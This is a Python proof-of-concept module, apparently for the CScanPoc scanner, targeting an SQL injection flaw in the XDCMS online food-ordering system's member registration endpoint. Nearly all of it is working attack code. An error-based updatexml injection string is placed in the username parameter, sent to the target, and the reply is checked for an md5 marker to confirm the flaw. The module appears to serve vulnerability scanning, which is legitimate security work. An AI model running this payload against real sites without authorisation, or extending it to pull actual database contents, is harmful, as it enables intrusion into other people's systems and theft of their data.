# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'XDCMS_0001'  # 平台漏洞编号，留空
    name = 'XDCMS网上订餐系统 sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-05'  # 漏洞公布时间
    desc = '''
        XDcms是南宁旭东网络科技有限公司推出的一套开源的通用的内容管理系统。主要使用php+mysql+smarty技术基础进行开发，XDcms采用OOP（面向对象）方式进行基础运行框架搭建。模块化开发方式做为功能开发形式。框架易于功能扩展，代码维护，二次开发能力优秀。
        旭东企业网站管理系统订餐网站管理系统，主要使用PHP开发的在线订餐门户网站系统，集成在线订餐、团购、积分商城、优惠券、新闻资讯、在线订单、在线支付、生成订单短信/邮箱通知、点评、Baidu地图、无线打印机、手机订餐功能于一体餐饮行业门户。
        XDCMS网上订餐系统 /index.php?m=member&f=register_save SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=94532'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'XDCMS(旭东企业网站管理系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ec0a8e59-bc79-416e-a3f3-673b7f2c6ff2'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            target = arg + "/index.php?m=member&f=register_save"
            data = {
                "username": "sss' And 1 like(updAtexml(1,concat(0x5e24,(Select concat(md5(123),0x3a,0x3a)),0x5e24),1))#",
                "password": "123456",
                "password2": "123456",
                "fields[truename]": "",
                "fileds[email]": "",
                "submit": " ? ? "
            }
            payload = urllib.parse.urlencode(data)
            req = requests.get(target+"?"+payload)
            if req.status_code == 200 and "ac59075b964b0715" in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
